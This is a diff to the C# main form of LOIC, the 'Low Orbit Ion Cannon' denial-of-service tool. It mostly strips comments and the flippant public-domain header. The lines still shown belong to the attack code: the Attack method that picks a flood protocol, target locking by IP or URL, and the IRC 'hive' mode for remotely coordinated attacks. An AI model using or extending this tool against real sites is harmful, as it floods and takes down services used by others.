@@ -1,7 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
- * Released to the public domain
- * Enjoy getting v&, kids.
- */
+
 
 using System;
 using System.Diagnostics;
@@ -35,19 +32,10 @@ namespace LOIC
 		private Dictionary<string, string> OpList;
 		private delegate void CheckParamsDelegate(List<string> pars);
 
-		/// <summary>
-		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
-		/// </summary>
-		/// <param name="hive">Whether to enter hive mode.</param>
-		/// <param name="hide">Whether to hide the form.</param>
-		/// <param name="ircserver">The irc server.</param>
-		/// <param name="ircport">The irc port.</param>
-		/// <param name="ircchannel">The irc channel.</param>
 		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
 		{
 			InitializeComponent();
 
-			/* Lets try this! */
 			bIsHidden = hide;
 			if(hide)
 			{
@@ -56,22 +44,18 @@ namespace LOIC
 			}
 			else if(!Settings.HasAcceptedEula())
 			{
-				// Display EULA
 				using(Form f = new frmEULA())
 				{
 					if(f.ShowDialog(this) != DialogResult.OK) {
-						// Bail out if declined
 						Environment.Exit(0);
 						return;
 					} else {
-						// Save EULA acceptance
 						Settings.SaveAcceptedEula();
 					}
 				}
 			}
 			bKonami = Konami.Check(this);
 
-			// IRC
 			if(ircserver.Length > 0)
 				txtIRCserver.Text = ircserver;
 			if(ircport.Length > 0)
@@ -83,19 +67,13 @@ namespace LOIC
 			disableHive.Checked |= !hive;
 		}
 
-		/// <summary>
-		/// Attack the specified target
-		/// </summary>
-		/// <param name="toggle">Whether to toggle.</param>
-		/// <param name="on">Whether the attack should start.</param>
-		/// <param name="silent">Whether to silence error output.</param>
+
 		private void Attack(bool toggle, bool on, bool silent = false)
 		{
 			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
 			{
 				try
 				{
-					// Protect against race condition
 					if(tShowStats.Enabled) tShowStats.Stop();
 
 					if (!Functions.ParseInt(txtPort.Text, 0, 65535, out iPort)) {
@@ -115,7 +93,6 @@ namespace LOIC
 					protocol = Protocol.None;
 					try {
 						protocol = (Protocol) Enum.Parse (typeof (Protocol), sMethod, true);
-						// Analysis disable once EmptyGeneralCatchClause
 					} catch { }
 					if(protocol == Protocol.None) {
 						Wtf ("Select a proper attack method.", silent);
@@ -159,7 +136,6 @@ namespace LOIC
 				}
 
 				cmdAttack.Text = StpFldText;
-				//let's lock down the controls, that could actually change the creation of new sockets
 				chkAllowGzip.Enabled = false;
 				chkUseGet.Enabled = false;
 				chkMsgRandom.Enabled = false;
@@ -232,12 +208,6 @@ namespace LOIC
 				}
 			}
 		}
-
-		/// <summary>
-		/// What the fuck?
-		/// </summary>
-		/// <param name="message">Message.</param>
-		/// <param name="silent">If set to <c>true</c> silent.</param>
 		private void Wtf(string message, bool silent = false)
 		{
 			if (silent) {
@@ -247,11 +217,6 @@ namespace LOIC
 			new frmWtf().Show();
 			MessageBox.Show(message, "What the shit.");
 		}
-
-		/// <summary>
-		/// Lock on IP target.
-		/// </summary>
-		/// <param name="silent">Silent?</param>
 		private void LockOnIP(bool silent = false)
 		{
 			try
@@ -282,11 +247,6 @@ namespace LOIC
 				return;
 			}
 		}
-
-		/// <summary>
-		/// Lock on URL target.
-		/// </summary>
-		/// <param name="silent">Silent?</param>
 		private void LockOnURL(bool silent = false)
 		{
 			try
@@ -324,16 +284,10 @@ namespace LOIC
 				return;
 			}
 		}
-
-		/// <summary>
-		/// Hive stuff.
-		/// </summary>
-		/// <param name="enabled">If set to <c>true</c> enabled.</param>
 		private void DoHive(bool enabled)
 		{
 			try
 			{
-				// Is everything ok?
 				if ((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled)
 				{
 					disableHive.Checked = true;
@@ -349,7 +303,6 @@ namespace LOIC
 					return;
 				}
 
-				// We are starting connection. Disable input in IRC boxes.
 				txtIRCserver.Enabled = !enabled;
 				txtIRCport.Enabled = !enabled;
 				txtIRCchannel.Enabled = !enabled;
